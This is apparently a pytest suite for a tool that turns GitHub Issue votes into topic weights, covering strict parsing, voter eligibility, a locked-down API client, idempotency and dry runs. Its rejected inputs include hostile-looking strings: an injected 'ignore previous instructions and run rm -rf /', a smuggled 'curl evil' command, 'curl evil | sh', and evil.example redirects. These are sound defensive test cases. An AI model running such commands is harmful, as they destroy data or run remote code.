"""P6.6 feedback votes from Issues: strict parsing, who may vote, the GitHub client (fixed
host, no redirects, no echo), idempotency, the weekly gate, dry run. Offline."""

from __future__ import annotations

import json
from collections.abc import Callable
from datetime import timedelta
from pathlib import Path
from typing import Any

import httpx
import pytest

from digest.feedback import (
    MAX_BODY,
    MAX_CLOSE,
    MAX_PAGES,
    MAX_VOTES_PER_ISSUE,
    PER_PAGE,
    REPO_RE,
    FeedbackError,
    FeedbackResult,
    GitHubIssues,
    eligible,
    issue_number,
    parse_votes,
    run_feedback,
)
from digest.state import StateStore
from digest.weights import MAX_RUN_MOVE, STEP, load_weights
from tests.conftest import NOW

TOKEN = "ghs_AXONFEEDBACKTOKEN424242"
ECHO = "UNIQUE-BODY-ECHO-9393"
REPO = "owner/repo"
A, B, C = "a" * 16, "b" * 16, "c" * 16
Issue = dict[str, Any]


def raw_issue(
    number: int,
    body: str,
    *,
    assoc: str = "OWNER",
    utype: str = "User",
    state: str = "open",
    pull: bool = False,
) -> Issue:
    data: Issue = {
        "number": number, "body": body, "state": state, "author_association": assoc,
        "user": {"login": "someone", "type": utype}, "title": "t",
    }  # fmt: skip
    if pull:
        data["pull_request"] = {"url": "https://api.github.com/x"}
    return data


class GitHub:
    """A fake issues API. Open issues are served in pages; PATCH closes one."""

    def __init__(self, issues: list[Issue], *, close_fails: set[int] | None = None) -> None:
        self.issues = issues
        self.close_fails = close_fails or set()
        self.requests: list[httpx.Request] = []
        self.closed: list[int] = []
        self.fail: Callable[[httpx.Request], httpx.Response | None] = lambda _r: None
        self.client = httpx.Client(transport=httpx.MockTransport(self.handle))

    def handle(self, request: httpx.Request) -> httpx.Response:
        self.requests.append(request)
        forced = self.fail(request)
        if forced is not None:
            return forced
        if request.method == "GET":
            page = int(request.url.params.get("page", "1"))
            per = int(request.url.params.get("per_page", "30"))
            open_now = [i for i in self.issues if i["number"] not in self.closed]
            return httpx.Response(200, json=open_now[(page - 1) * per : page * per])
        number = int(request.url.path.rsplit("/", 1)[1])
        if number in self.close_fails:
            return httpx.Response(500, text=f"{ECHO} {TOKEN}")
        self.closed.append(number)
        return httpx.Response(200, json={"number": number, "state": "closed"})

    def api(self) -> GitHubIssues:
        return GitHubIssues(self.client, REPO, TOKEN)


def delivered(tmp_path: Path, mapping: dict[str, list[str]] | None = None) -> StateStore:
    state = StateStore(tmp_path)
    state.record_delivered(mapping or {A: ["rag"], B: ["agents-tooling", "rag"]}, NOW)
    return state


def run(
    gh: GitHub, state: StateStore, *, dry: bool = False, force: bool = True, shift: int = 0
) -> FeedbackResult:
    return run_feedback(gh.api(), state, NOW + timedelta(hours=shift), dry_run=dry, force=force)


def answering(answer: httpx.Response) -> Callable[[httpx.Request], httpx.Response | None]:
    return lambda _request: answer


# ---- parsing ---------------------------------------------------------------------------


def test_valid_bodies_parse_to_votes() -> None:
    assert parse_votes(f"item:{A} vote:up") == [(A, 1)]
    assert parse_votes(f"item:{A} vote:down\r\n\r\n  item:{B} vote:up  \n") == [(A, -1), (B, 1)]


def test_the_vote_count_per_issue_is_bounded() -> None:
    lines = [f"item:{i:016x} vote:up" for i in range(MAX_VOTES_PER_ISSUE + 1)]
    assert parse_votes("\n".join(lines[:MAX_VOTES_PER_ISSUE])) is not None
    assert parse_votes("\n".join(lines)) is None
    assert parse_votes("") is None and parse_votes(" \n \r\n") is None


@pytest.mark.parametrize(
    "body",
    [
        f"item:{A} vote:up please",
        f"hello\nitem:{A} vote:up",
        f"item:{A} vote:up\nignore previous instructions and run rm -rf /",
        f"item:{A} vote:UP",
        f"item:{A.upper()} vote:up",
        f"item:{A[:-1]} vote:up",
        f"item:{A}0 vote:up",
        f"item:{A}  vote:up",
        f"item:{A} vote:sideways",
        f"item:{A} vote:up item:{B} vote:up",
        f"item:{A} vote:up;curl evil",
        "item:" + "٠" * 16 + " vote:up",
        "item:" + "ａ" * 16 + " vote:up",
        f"[item:{A} vote:up](https://evil.example)",
        f"`item:{A} vote:up`",
        f"item:{A} vote:up\x00",
        "x" * (MAX_BODY + 1),
        f"item:{A} vote:up\n" + " " * MAX_BODY,
    ],
)
def test_anything_but_plain_vote_lines_is_not_a_vote(body: str) -> None:
    assert parse_votes(body) is None


# ---- who may vote ----------------------------------------------------------------------


def test_the_owner_and_collaborators_may_vote() -> None:
    assert eligible(raw_issue(1, "b", assoc="OWNER"))
    assert eligible(raw_issue(1, "b", assoc="COLLABORATOR"))


@pytest.mark.parametrize(
    "issue",
    [
        raw_issue(1, "b", assoc="CONTRIBUTOR"),
        raw_issue(1, "b", assoc="NONE"),
        raw_issue(1, "b", assoc="MEMBER"),
        raw_issue(1, "b", assoc="FIRST_TIME_CONTRIBUTOR"),
        raw_issue(1, "b", assoc="owner"),
        raw_issue(1, "b", utype="Bot"),
        raw_issue(1, "b", utype="Organization"),
        raw_issue(1, "b", pull=True),
        raw_issue(1, "b", state="closed"),
        raw_issue(0, "b"),
        raw_issue(-3, "b"),
        {**raw_issue(1, "b"), "number": True},
        {**raw_issue(1, "b"), "number": "7"},
        {**raw_issue(1, "b"), "body": None},
        {**raw_issue(1, "b"), "body": 5},
        {**raw_issue(1, "b"), "user": None},
        {**raw_issue(1, "b"), "user": "owner"},
        {k: v for k, v in raw_issue(1, "b").items() if k != "author_association"},
    ],
)
def test_everyone_else_is_ignored(issue: Issue) -> None:
    assert not eligible(issue)


def test_issue_number_accepts_only_positive_integers() -> None:
    assert issue_number({"number": 5}) == 5
    for bad in (0, -1, True, "5", 5.0, None):
        assert issue_number({"number": bad}) is None
    assert issue_number({}) is None


# ---- the GitHub client -----------------------------------------------------------------


@pytest.mark.parametrize(
    "repo",
    [
        "", "owner", "a/b/c", "../x", "o/..", "o/.", "o/r?x=1", "o/r#f", "o r/x", "o/r\n",
        "o/" + "x" * 101, "@o/r", "o/r/../../x", "https://evil.example/r", "o\\r",
    ],
)  # fmt: skip
def test_a_bad_repository_name_is_refused_before_any_request(repo: str) -> None:
    gh = GitHub([])
    with pytest.raises(FeedbackError):
        GitHubIssues(gh.client, repo, TOKEN)
    assert gh.requests == []


def test_good_repository_names_pass() -> None:
    for repo in ("owner/repo", "a/b", "my-org/my.repo_1", "o/.github"):
        assert REPO_RE.fullmatch(repo)


def test_an_empty_token_is_refused() -> None:
    with pytest.raises(FeedbackError, match="not set"):
        GitHubIssues(GitHub([]).client, REPO, "")


def test_requests_go_to_the_fixed_host_with_the_token_in_a_header_only() -> None:
    gh = GitHub([raw_issue(1, "b")])
    gh.api().open_issues()
    (req,) = gh.requests
    assert req.url.host == "api.github.com" and req.url.scheme == "https"
    assert req.url.path == f"/repos/{REPO}/issues"
    assert req.headers["authorization"] == f"Bearer {TOKEN}"
    assert req.headers["x-github-api-version"] == "2022-11-28"
    assert TOKEN not in str(req.url)
    assert dict(req.url.params) == {
        "state": "open", "per_page": str(PER_PAGE), "page": "1",
        "sort": "created", "direction": "asc",
    }  # fmt: skip


def test_the_client_refuses_an_address_that_is_not_the_issues_api() -> None:
    gh = GitHub([])
    api = gh.api()
    for url in (
        "https://evil.example/repos/o/r/issues",
        "http://api.github.com/repos/o/r/issues",
        "https://api.github.com.evil.example/repos/o/r/issues",
        "https://api.github.com/repos/o/r/issues/1/comments",
        "https://api.github.com/repos/o/r/issues?x=1",
        "https://api.github.com/user",
    ):
        with pytest.raises(FeedbackError, match="unexpected address"):
            api._send("GET", url)
    assert gh.requests == []


def test_the_token_never_appears_in_repr() -> None:
    assert TOKEN not in repr(GitHub([]).api())


def test_pagination_stops_on_a_short_page_and_at_the_page_cap() -> None:
    many = [raw_issue(n, "b") for n in range(1, PER_PAGE * 5)]
    gh = GitHub(many)
    assert len(gh.api().open_issues()) == PER_PAGE * MAX_PAGES
    assert len(gh.requests) == MAX_PAGES
    short = GitHub([raw_issue(n, "b") for n in range(1, 6)])
    assert len(short.api().open_issues()) == 5 and len(short.requests) == 1


def test_non_object_rows_are_skipped() -> None:
    gh = GitHub([])
    gh.fail = lambda _r: httpx.Response(200, json=[1, "x", None, raw_issue(1, "b")])
    assert [i["number"] for i in gh.api().open_issues()] == [1]


@pytest.mark.parametrize(
    ("code", "needle"),
    [
        (401, "rejected the GITHUB_TOKEN"), (403, "issues: write"), (429, "issues: write"),
        (404, "not found"), (301, "redirected"), (302, "redirected"), (500, "unexpected"),
        (204, "unexpected"),
    ],
)  # fmt: skip
def test_errors_are_fixed_texts_that_never_echo_the_body_or_token(code: int, needle: str) -> None:
    gh = GitHub([])
    gh.fail = lambda _r: httpx.Response(
        code, text=f"{ECHO} {TOKEN}", headers={"location": "https://evil.example/"}
    )
    with pytest.raises(FeedbackError) as err:
        gh.api().open_issues()
    assert needle in str(err.value) and str(code) in str(err.value)
    assert ECHO not in str(err.value) and TOKEN not in str(err.value)
    assert [r.url.host for r in gh.requests] == ["api.github.com"]  # the redirect was not followed


def test_unreachable_oversized_and_malformed_answers() -> None:
    gh = GitHub([])

    def boom(_r: httpx.Request) -> httpx.Response:
        raise httpx.ConnectError(f"cannot reach {TOKEN}")

    gh.client = httpx.Client(transport=httpx.MockTransport(boom))
    with pytest.raises(FeedbackError) as err:
        gh.api().open_issues()
    assert TOKEN not in str(err.value) and "ConnectError" in str(err.value)
    for answer, needle in (
        (httpx.Response(200, text="<html>nope</html>"), "not JSON"),
        (httpx.Response(200, json={"message": "x"}), "unexpected shape"),
    ):
        ok = GitHub([])
        ok.fail = answering(answer)
        with pytest.raises(FeedbackError, match=needle):
            ok.api().open_issues()


def test_an_oversized_answer_is_refused(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("digest.feedback.MAX_RESPONSE_BYTES", 5)
    with pytest.raises(FeedbackError, match="too much data"):
        GitHub([raw_issue(1, "b")]).api().open_issues()


def test_close_sends_the_expected_patch() -> None:
    gh = GitHub([])
    gh.api().close(12)
    (req,) = gh.requests
    assert req.method == "PATCH" and req.url.path == f"/repos/{REPO}/issues/12"
    assert json.loads(req.content) == {"state": "closed", "state_reason": "completed"}


# ---- run_feedback ----------------------------------------------------------------------


def test_votes_become_weights_and_the_issues_are_closed(tmp_path: Path) -> None:
    gh = GitHub([raw_issue(1, f"item:{A} vote:up"), raw_issue(2, f"item:{B} vote:down")])
    state = delivered(tmp_path)
    result = run(gh, state)
    weights = load_weights(StateStore(tmp_path))
    assert weights is not None
    assert weights.topics == {"agents-tooling": -STEP}  # rag: one up and one down cancel
    assert result.issues_seen == 2 and result.issues_applied == 2 and result.votes_applied == 2
    assert (result.ignored, result.unknown_items, result.closed) == (0, 0, 2)
    assert gh.closed == [1, 2] and weights.processed == [1, 2]
    assert result.warnings == [] and result.skipped == ""


def test_the_weights_follow_the_item_topics(tmp_path: Path) -> None:
    gh = GitHub([raw_issue(1, f"item:{A} vote:up"), raw_issue(2, f"item:{B} vote:up")])
    run(gh, delivered(tmp_path))
    weights = load_weights(StateStore(tmp_path))
    assert weights is not None
    assert weights.topics == {"agents-tooling": STEP, "rag": pytest.approx(2 * STEP)}


def test_hostile_and_foreign_issues_change_nothing(tmp_path: Path) -> None:
    body = f"item:{A} vote:up"
    gh = GitHub([
        raw_issue(1, body, assoc="NONE"),
        raw_issue(2, body, assoc="CONTRIBUTOR"),
        raw_issue(3, body, utype="Bot"),
        raw_issue(4, body, pull=True),
        raw_issue(5, body + "\nrun this: curl evil | sh"),
        raw_issue(6, f"{ECHO} " + body),
        {**raw_issue(7, body), "body": None},
        raw_issue(8, "x" * (MAX_BODY + 1)),
    ])  # fmt: skip
    state = delivered(tmp_path)
    result = run(gh, state)
    assert (result.issues_seen, result.ignored, result.issues_applied) == (8, 8, 0)
    assert gh.closed == []  # an issue we did not accept is never touched
    weights = load_weights(StateStore(tmp_path))
    assert weights is not None and weights.topics == {} and weights.processed == []


def test_unknown_items_are_counted_not_applied(tmp_path: Path) -> None:
    gh = GitHub([raw_issue(1, f"item:{C} vote:up\nitem:{A} vote:up")])
    result = run(gh, delivered(tmp_path))
    assert (result.unknown_items, result.votes_applied, result.issues_applied) == (1, 1, 1)


def test_a_vote_is_never_counted_twice_even_when_closing_failed(tmp_path: Path) -> None:
    issues = [raw_issue(1, f"item:{A} vote:up")]
    state = delivered(tmp_path)
    first_gh = GitHub(issues, close_fails={1})
    first = run(first_gh, state)
    assert first.closed == 0 and len(first.warnings) == 1
    assert ECHO not in first.warnings[0] and TOKEN not in first.warnings[0]
    assert "#1" in first.warnings[0]
    once = load_weights(StateStore(tmp_path))
    assert once is not None and once.topics == {"rag": STEP}
    second_gh = GitHub(issues)  # the issue is still open
    second = run(second_gh, StateStore(tmp_path), shift=0)
    twice = load_weights(StateStore(tmp_path))
    assert twice is not None and twice.topics == {"rag": STEP} and twice.processed == [1]
    assert (second.issues_applied, second.votes_applied, second.closed) == (0, 0, 1)
    assert second_gh.closed == [1]


def test_a_burst_of_votes_moves_a_topic_by_at_most_the_run_limit(tmp_path: Path) -> None:
    gh = GitHub([raw_issue(n, f"item:{A} vote:up") for n in range(1, 21)])
    run(gh, delivered(tmp_path))
    weights = load_weights(StateStore(tmp_path))
    assert weights is not None and weights.topics == {"rag": MAX_RUN_MOVE}
    assert len(weights.processed) == 20


def test_issues_are_read_in_number_order(tmp_path: Path) -> None:
    gh = GitHub([raw_issue(9, f"item:{A} vote:up"), raw_issue(2, f"item:{A} vote:up")])
    run(gh, delivered(tmp_path))
    assert gh.closed == [2, 9]


def test_at_most_the_close_cap_is_closed_per_run(tmp_path: Path) -> None:
    gh = GitHub([raw_issue(n, f"item:{A} vote:up") for n in range(1, MAX_CLOSE + 31)])
    result = run(gh, delivered(tmp_path))
    assert result.closed == MAX_CLOSE == len(gh.closed)


def test_the_step_is_weekly_unless_forced(tmp_path: Path) -> None:
    state = delivered(tmp_path)
    run(GitHub([]), state)
    quiet = GitHub([raw_issue(1, f"item:{A} vote:up")])
    skipped = run(quiet, StateStore(tmp_path), force=False, shift=24 * 5)
    assert skipped.skipped and quiet.requests == []  # not even a request to GitHub
    due = run(quiet, StateStore(tmp_path), force=False, shift=24 * 7)
    assert due.skipped == "" and due.issues_applied == 1
    forced = GitHub([])
    assert run(forced, StateStore(tmp_path), force=True, shift=24 * 7 + 1).skipped == ""


def test_the_first_run_is_always_due(tmp_path: Path) -> None:
    assert run(GitHub([]), delivered(tmp_path), force=False).skipped == ""


def test_a_dry_run_reads_and_counts_but_writes_and_closes_nothing(tmp_path: Path) -> None:
    gh = GitHub([raw_issue(1, f"item:{A} vote:up")])
    state = delivered(tmp_path)
    result = run(gh, state, dry=True)
    assert result.issues_applied == 1 and result.votes_applied == 1 and result.closed == 0
    assert gh.closed == [] and [r.method for r in gh.requests] == ["GET"]
    assert load_weights(StateStore(tmp_path)) is None


def test_an_api_error_propagates_as_a_fixed_error_and_changes_nothing(tmp_path: Path) -> None:
    gh = GitHub([])
    gh.fail = lambda _r: httpx.Response(401, text=f"{ECHO} {TOKEN}")
    state = delivered(tmp_path)
    with pytest.raises(FeedbackError) as err:
        run(gh, state)
    assert ECHO not in str(err.value) and TOKEN not in str(err.value)
    assert load_weights(StateStore(tmp_path)) is None


def test_an_empty_repository_still_records_the_run(tmp_path: Path) -> None:
    result = run(GitHub([]), delivered(tmp_path))
    weights = load_weights(StateStore(tmp_path))
    assert result.issues_seen == 0 and weights is not None and weights.updated_at == NOW


def test_nothing_secret_or_echoed_is_stored(tmp_path: Path) -> None:
    gh = GitHub([raw_issue(1, f"item:{A} vote:up"), raw_issue(2, f"{ECHO} {TOKEN}")])
    run(gh, delivered(tmp_path))
    stored = "\n".join(p.read_text(encoding="utf-8") for p in tmp_path.rglob("*") if p.is_file())
    assert TOKEN not in stored and ECHO not in stored and "someone" not in stored
